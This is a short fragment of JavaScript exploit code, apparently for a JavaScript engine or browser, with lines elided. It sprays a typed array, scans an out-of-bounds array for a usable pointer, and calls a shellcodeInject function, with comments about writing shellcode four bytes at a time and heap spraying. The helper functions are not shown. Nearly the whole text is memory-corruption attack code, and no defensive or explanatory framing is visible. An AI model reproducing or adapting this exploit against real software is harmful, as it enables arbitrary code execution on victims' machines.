...
for(var i=0; i<0x1337; i=i+1) {uint32_Array[i]=0x4141414141}
...
//shellcode need write 4 byte by 4 byte
...
//3708
//3713
for(i=3709; i<0x13377; i++){
  print(i)
  p_i2(oob_Array[i]);
  xxx=d_to_i2(oob_Array[i])
  if(xxx[0]>0){
      //something like heap spraying to trigger
      shellcodeInject(d_to_i2(oob_Array[i]), shellcode);
      ss(1);
    }
}
